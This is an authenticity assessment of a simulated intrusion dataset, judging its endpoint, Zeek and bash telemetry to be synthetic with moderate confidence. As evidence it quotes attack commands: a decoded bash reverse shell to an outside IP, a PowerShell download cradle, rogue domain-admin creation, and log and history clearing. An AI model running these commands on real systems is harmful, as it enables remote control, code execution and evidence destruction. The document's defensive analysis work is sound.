# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Confidence:** 66

## Executive Summary

This dataset is highly convincing at the source-correlation level: the attack chain is visible across endpoint, Windows Security/Sysmon, Zeek, bash history, and proxy-style traffic without obvious impossible ordering. I judge it synthetic by a moderate margin because the attack narrative and several behavioral/background patterns feel deliberately constructed for huntability rather than organically accumulated from production telemetry.

## Evidence For Synthetic

- The kill chain is very “training complete” inside a short window: web shell, reverse shell, PsExec-style DC access, domain admin creation, persistence, file staging, database dump, SMB collection, proxy exfiltration, PowerShell download cradle, log clearing, and account cleanup all occur between roughly 13:20Z and 17:50Z.
- Linux bash histories reuse exact generic commands across many users/hosts: `journalctl --no-pager -n 5` appears in six separate histories, while commands like `cat /etc/os-release`, `cd /var/log`, `dmesg --ctime | tail -20`, `history`, and `grep -i failed /var/log/auth.log | tail` recur across five.
- The DNS tunnel grammar in `zeek-core/dns.json` feels purpose-built and readable: many TXT answers use strings such as `xid:66c25015f784:path-e80:n268` and repeated low TTLs under `ns1.westbridge-services.net`. That is plausible malware behavior, but the field names and sequence markers are unusually explanatory.
- The DB exfil stage is slightly undersized for a production EHR narrative: `DB-PROD-01` runs `mysqldump --single-transaction ehr patients insurance_claims`, but the associated SSH/SCP transfer in `zeek-core/conn.json:4009` is only `orig_bytes=90172`.
- Several artifact names are tidy in a way that feels authored: `svc_mhsync`, `DeviceSyncSvc`, `cache_7f3a.zip`, and `rpt_0318.sql.gz` are plausible individually, but collectively they read like clean breadcrumbs.

## Evidence For Real

- Source-native Windows event semantics are strong. On `DC-01`, Security 4697 records `PSEXESVC`, 4720 creates `svc_mhsync`, 4728 adds it to Domain Admins, 4726 deletes it, and 1102 follows `wevtutil cl Security`.
- Cross-source timing is credible without obvious impossible ordering. Example: `FILE-SRV-01` creates `C:\ProgramData\Microsoft\cache_7f3a.zip` at 17:01:31Z, Zeek records SMB transfer of that ZIP to `10.10.1.35` at 17:22:17Z with `seen_bytes=314685609`, then `zeek-dmz/conn.json:5919` shows `10.10.3.20 -> 45.33.32.30:443` with `orig_bytes=315302218`.
- The environment has realistic background entropy: Kerberos 4768/4769 activity, DHCP renewals, OCSP/X509 logs, WPAD/ISATAP NXDOMAINs, Windows Update/Defender-style processes, and noisy admin shell commands.
- User behavior includes believable messiness, including typos like `journalclt`, `geetnt`, and `sl`, plus mundane troubleshooting commands mixed with attack traffic.
- The host/IP topology is coherent: workstations in `10.10.1.0/24`, servers in `10.10.2.0/24`, DMZ/proxy/web in `10.10.3.0/24`, and DB in `10.10.4.0/24`.

## Detailed Analysis

The data spans about 2024-03-18 12:00:07Z to 19:54:25Z and includes 73 files: Windows Security/Sysmon XML, eCAR JSON, Zeek core/DMZ logs, and Linux bash histories. The visible environment includes `DC-01` at `10.10.2.10`, `FILE-SRV-01` at `10.10.2.20`, `APP-INT-01` at `10.10.2.30`, `WEB-EXT-01` at `10.10.3.10`, `PROXY-01` at `10.10.3.20`, `DB-PROD-01` at `10.10.4.10`, and multiple workstations.

The attack spine starts cleanly on `WEB-EXT-01`: at 13:20:16.670Z, eCAR records `/usr/sbin/apache2` spawning `/bin/bash` with a base64 payload that decodes to `bash -c "bash -i >& /dev/tcp/45.33.32.30/8443 0>&1"`. One second later, `zeek-dmz/conn.json:1532` shows `10.10.3.10:34496 -> 45.33.32.30:8443`, `conn_state=SF`, duration about 21 seconds.

The Windows escalation path is coherent. `DC-01` Sysmon records `C:\Windows\PSEXESVC.exe` creation at 15:59:57.878Z, and Security 4697 records service `PSEXESVC` at 15:59:58.111Z under `aisha.johnson`. At 16:15:26Z, both Security/Sysmon show `net user svc_mhsync MhsSvc!2024 /add /domain`; at 16:15:40Z, Security 4728 places `svc_mhsync` into Domain Admins. Persistence follows with `sc.exe create DeviceSyncSvc...` at 16:19:51Z and a scheduled task at 16:20:02Z.

The data collection and exfiltration chain is the strongest realism point. `FILE-SRV-01` runs PowerShell `Compress-Archive` against finance and patient export paths at 17:01:31Z, creating `C:\ProgramData\Microsoft\cache_7f3a.zip`. Zeek later observes an SMB file transfer of that exact ZIP from `10.10.2.20` to `10.10.1.35`, with `seen_bytes=314685609`. Shortly after, the proxy’s outbound TLS connection to `45.33.32.30` carries `315302218` orig bytes, which is close enough to account for the ZIP plus protocol overhead.

There is also a parallel DB collection thread: `DB-PROD-01` root bash history and eCAR show `mysqldump`, `gzip`, and `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz` between 17:15Z and 17:20Z. `APP-INT-01` records the file creation at 17:19:35Z and later runs `history -c && cat /dev/null > ~/.bash_history` at 17:41:14Z. That sequencing is plausible, though the Zeek byte count for the SCP leg feels small for a production healthcare database dump.

The cleanup is also source-native: `DC-01` runs encoded PowerShell at 17:42:22Z that decodes to `IEX (New-Object Net.WebClient).DownloadString("https://api.westbridge-services.net/v2/manifest")`, then `wevtutil cl Security` at 17:42:23Z. Security event 1102 appears at 17:42:25Z, and later `net user svc_mhsync /delete /domain` appears at 17:49:57Z with Security 4726 at 17:49:58Z.

My hesitation is behavioral, not structural. The telemetry mechanics are good, but the scenario has the feel of a polished hunt exercise: every major pivot is visible, artifact names are meaningful, the malicious path is compact, and benign command histories have detectable repeated-command pools.

## Realism Score by Category

- **Field format accuracy:** 8 — Windows, Sysmon, Zeek, eCAR, and bash formats are mostly source-plausible.
- **Temporal patterns:** 7 — Workday and beacon timing look plausible, but the full attack is unusually compressed.
- **Cross-source correlation:** 9 — Process, auth, file, SMB, proxy, and TLS evidence line up very well.
- **Behavioral realism:** 6 — Attack and admin behavior are credible but too narratively tidy.
- **Environmental consistency:** 8 — Host roles, IP ranges, AD behavior, and background noise are internally consistent.

## Recommendations

If synthetic, improve realism by reducing exact bash command reuse across personas, stretching the intrusion over a longer dwell period, adding more dead ends and partial visibility, making DNS tunnel payloads less human-readable, and scaling file/database transfer sizes to match the implied production business context. Keep the current cross-source correlation model; that is the strongest part of the dataset.
